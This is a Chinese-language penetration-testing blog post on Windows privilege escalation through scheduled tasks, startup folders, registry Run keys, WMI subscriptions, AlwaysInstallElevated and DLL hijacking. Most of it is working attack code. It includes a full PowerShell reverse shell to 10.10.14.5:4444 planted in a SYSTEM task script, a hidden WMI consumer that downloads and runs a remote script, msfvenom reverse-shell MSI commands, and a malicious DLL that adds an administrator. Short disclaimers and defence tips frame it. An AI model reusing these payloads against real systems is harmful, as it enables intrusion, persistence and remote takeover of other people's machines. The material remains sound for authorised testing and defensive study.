---
title: "Windows提权：计划任务与启动项"
date: 2024-12-15 08:00:00
tags:
  - 权限提升
  - 渗透测试
description: Windows 提权——计划任务劫持、启动文件夹与注册表 Run 键利用。
categories: 渗透测试
---

## 引言

在Windows渗透测试中，计划任务（Scheduled Tasks）和启动项（Startup Items）常以高权限身份运行，是提权的核心目标。本文系统梳理七种与计划任务和启动项相关的提权技术，提供检测与利用示例。

> **免责声明**：本文所述技术仅供安全研究和授权渗透测试使用。未经授权对他人系统实施攻击属于违法行为。

---

## 一、计划任务枚举（schtasks Enumeration）

### 1.1 基本枚举

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo CSV /v > tasks.csv
schtasks /query /fo TABLE
```

### 1.2 PowerShell枚举

```powershell
Get-ScheduledTask | ForEach-Object {
    $actions = ($_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join "; "
    Write-Output "$($_.TaskName) | $($_.State) | $actions"
}
```

### 1.3 重点目标

枚举时应关注：以`NT AUTHORITY\SYSTEM`运行的任务、操作指向用户可写目录（`C:\Users\Public\`）的任务、路径不含引号可能被劫持的任务、触发器为`At logon`或`At startup`的任务。

```cmd
accesschk.exe -dqv "C:\Windows\System32\Tasks"
accesschk.exe -qv "C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator\Reboot"
```

---

## 二、启动文件夹利用（Startup Folder Exploitation）

### 2.1 关键路径

| 启动文件夹 | 路径 |
|-----------|------|
| 当前用户 | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |
| 所有用户 | `%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |

### 2.2 权限检查与利用

```cmd
icacls "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
# 检查写入权限
(Get-Acl "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup").Access | 
    Where-Object {$_.FileSystemRights -match "Write|FullControl"}
```

若对`%PROGRAMDATA%`启动文件夹可写，可放置恶意文件等待管理员登录触发：

```powershell
Copy-Item "C:\temp\payload.exe" -Destination "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# 或创建隐蔽快捷方式
$sc = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.lnk")
$sc.TargetPath = "C:\temp\payload.exe"; $sc.WindowStyle = 7; $sc.Save()
```

---

## 三、注册表Run与RunOnce键

### 3.1 关键注册表位置

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

### 3.2 枚举

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

### 3.3 添加与劫持

```powershell
# 添加恶意条目
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdate" -Value "C:\Users\Public\payload.exe"

# 或使用reg命令
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t REG_SZ /d "C:\temp\payload.exe" /f

# 检查现有Run键引用文件是否可写
$runItems = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
foreach ($p in $runItems.PSObject.Properties) {
    if ($p.Name -notmatch "PS") {
        $acl = Get-Acl $p.Value -ErrorAction SilentlyContinue
        if ($acl.Access | Where-Object {$_.FileSystemRights -match "Write|FullControl"}) {
            Write-Host "[!] 可劫持: $($p.Name) -> $($p.Value)" -ForegroundColor Red
        }
    }
}
```

---

## 四、计划任务脚本劫持

### 4.1 查找可写任务文件

计划任务配置存储在`C:\Windows\System32\Tasks\`下的XML文件中。

```powershell
Get-ChildItem "C:\Windows\System32\Tasks" -Recurse -File | ForEach-Object {
    $acl = Get-Acl $_.FullName
    if ($acl.Access | Where-Object {
        $_.IdentityReference -eq [Security.Principal.WindowsIdentity]::GetCurrent().Name -and
        $_.FileSystemRights -match "Write|FullControl|Modify"}) {
        Write-Host "[!] 可写: $($_.FullName)" -ForegroundColor Red
    }
}
```

### 4.2 查找调用脚本的任务

```powershell
Get-ScheduledTask | ForEach-Object {
    foreach ($a in $_.Actions) {
        if ($a.Arguments -match "\.ps1|\.bat|\.cmd|\.vbs") {
            Write-Host "$($_.TaskName): $($a.Execute) $($a.Arguments)"
        }
    }
}
```

### 4.3 劫持示例

假设发现SYSTEM权限的`DailyBackup`任务执行`powershell.exe -File C:\Scripts\backup.ps1`，且该脚本可写：

```powershell
Copy-Item "C:\Scripts\backup.ps1" "C:\Scripts\backup.ps1.bak"
@'
$c=New-Object Net.Sockets.TCPClient("10.10.14.5",4444);$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length))-ne0){
$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
$r=(iex $d 2>&1|Out-String);$r2=$r+"PS>"
$sb=([text.encoding]::ASCII).GetBytes($r2)
$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
'@ | Out-File "C:\Scripts\backup.ps1" -Force
schtasks /run /tn "DailyBackup"
```

---

## 五、WMI事件订阅持久化与提权

### 5.1 原理

WMI事件订阅由三部分组成，触发后以SYSTEM权限执行代码：
- **__EventFilter**：定义触发条件
- **CommandLineEventConsumer / ActiveScriptEventConsumer**：定义操作
- **__FilterToConsumerBinding**：绑定二者

### 5.2 检测现有订阅

```cmd
wmic /namespace:"\\root\subscription" PATH __EventFilter GET Name, Query /format:list
wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer GET Name, CommandLineTemplate /format:list
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer GET Name, ScriptText /format:list
```

```powershell
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class ActiveScriptEventConsumer
```

### 5.3 创建WMI提权订阅

```powershell
# 过滤器：系统启动300秒后触发
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "SysMaintenance"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
}

# 消费者：SYSTEM权限执行反弹Shell
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "SysMaintenanceConsumer"
    CommandLineTemplate = 'powershell.exe -NoP -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/r.ps1'')"'
}

# 绑定
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

### 5.4 VBScript消费者

```powershell
Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments @{
    Name = "VbsPayload"
    ScriptingEngine = "VBScript"
    ScriptText = 'Set o=CreateObject("WScript.Shell"):o.Run "cmd /c net localgroup administrators lowuser /add",0,False'
}
```

### 5.5 清除

```powershell
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | ?{$_.Name -match "SysMaintenance|VbsPayload"} | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | ?{$_.Name -match "SysMaintenance"} | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

## 六、AlwaysInstallElevated注册表提权

### 6.1 原理

当HKCU和HKLM的`AlwaysInstallElevated`同时为`0x1`时，普通用户安装的MSI包将以SYSTEM权限运行。

### 6.2 检测

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
$hkcu = (Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA 0).AlwaysInstallElevated
$hklm = (Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA 0).AlwaysInstallElevated
if ($hkcu -eq 1 -and $hklm -eq 1) { Write-Host "[!] AlwaysInstallElevated 已启用" -ForegroundColor Red }
```

### 6.3 利用

```bash
# 攻击机生成MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o payload.msi
msfvenom -p windows/x64/exec CMD="net localgroup administrators user /add" -f msi -o adduser.msi
```

在目标机执行：

```cmd
msiexec /quiet /qn /i C:\temp\payload.msi
```

---

## 七、DLL搜索顺序劫持（DLL Search Order Hijacking）

### 7.1 Windows DLL搜索顺序

启用SafeDllSearchMode（默认）时的搜索顺序：
1. 应用程序所在目录 → 2. `System32\` → 3. `System\` → 4. `Windows\` → 5. 当前工作目录 → 6. PATH目录

若高权限进程所在目录缺失DLL且该目录对低权限用户可写，即可实施劫持。

### 7.2 使用ProcMon发现机会

用Process Monitor筛选计划任务进程，过滤器设为：`Result` = `NAME NOT FOUND`，`Path`以`.dll`结尾。这些即为可劫持的缺失DLL。

### 7.3 检测可写目录

```powershell
$commonDlls = @("version.dll","dbghelp.dll","profapi.dll","vcruntime140.dll","msvcp140.dll","cryptbase.dll")
$paths = Get-ScheduledTask | ForEach-Object { $_.Actions.Execute } | Where-Object {$_ -and (Test-Path $_)} | ForEach-Object { Split-Path $_ -Parent } | Select-Object -Unique
foreach ($d in $paths) {
    $acl = Get-Acl $d
    $canWrite = $acl.Access | Where-Object {
        ($_.IdentityReference -match "Users|Everyone") -and ($_.FileSystemRights -match "Write|FullControl")
    }
    if ($canWrite) {
        Write-Host "[!] DLL劫持机会: $d" -ForegroundColor Red
        foreach ($dll in $commonDlls) {
            if (-not (Test-Path "$d\$dll")) { Write-Host "  缺失: $d\$dll" -ForegroundColor Yellow }
        }
    }
}
```

### 7.4 恶意DLL制作

```c
// evil.c - 编译: x86_64-w64-mingw32-gcc -shared -o version.dll evil.c
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) {
        system("cmd /c net localgroup administrators lowuser /add");
    }
    return TRUE;
}
```

将编译好的DLL放置到可写的计划任务目录中即可：

```powershell
Copy-Item "C:\temp\version.dll" "C:\Program Files\Vendor\App\version.dll"
```

---

## 八、综合防御建议

1. **定期审计计划任务**：用PowerShell脚本检查异常TaskName和Action。
2. **限制启动文件夹权限**：确保只有受信用户可写入。
3. **监控注册表Run键**：使用Sysmon监控`Microsoft\Windows\CurrentVersion\Run*`的修改。
4. **审查WMI订阅**：定期检查`root\subscription`命名空间。
5. **禁用AlwaysInstallElevated**：确保两处注册表值不为`0x1`。
6. **最小权限原则**：计划任务执行目录和脚本目录不应被低权限用户写入。
7. **启用代码签名与SafeDllSearchMode**：防止未签名DLL被加载。

---

## 参考文献

- [Microsoft Docs - Task Scheduler](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
- [MITRE ATT&CK - Scheduled Task (T1053)](https://attack.mitre.org/techniques/T1053/)
- [MITRE ATT&CK - Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547/)
- [MITRE ATT&CK - Event Triggered Execution (T1546)](https://attack.mitre.org/techniques/T1546/)
- [MITRE ATT&CK - DLL Search Order Hijacking (T1574.001)](https://attack.mitre.org/techniques/T1574/001/)
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

---

> **再次声明**：本文仅供教育与授权的渗透测试用途。请在获得明确书面授权的前提下进行安全测试。
